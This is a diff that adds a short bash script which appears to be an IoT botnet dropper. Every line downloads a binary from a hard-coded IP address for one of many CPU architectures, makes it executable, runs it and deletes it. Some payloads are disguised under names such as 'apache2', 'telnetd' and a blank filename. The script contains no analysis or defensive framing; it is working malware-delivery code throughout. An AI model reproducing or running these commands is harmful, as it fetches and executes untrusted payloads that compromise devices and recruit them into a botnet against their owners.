@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randommips; chmod +x randommips; ./randommips; rm -rf randommips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randommipsel; chmod +x randommipsel; ./randommipsel; rm -rf randommipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomsh4; chmod +x randomsh4; ./randomsh4; rm -rf randomsh4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomx86; chmod +x randomx86; ./randomx86; rm -rf randomx86
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomarmv6l; chmod +x randomarmv6l; ./randomarmv6l; rm -rf randomarmv6l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomi686; chmod +x randomi686; ./randomi686; rm -rf randomi686
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomppc; chmod +x randomppc; ./randomppc; rm -rf randomppc
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomi586; chmod +x randomi586; ./randomi586; rm -rf randomi586
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/randomm68l; chmod +x randomm68l; ./randomm68l; rm -rf randomm68l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/sh; chmod +x sh; ./sh; rm -rf sh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.45.231/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
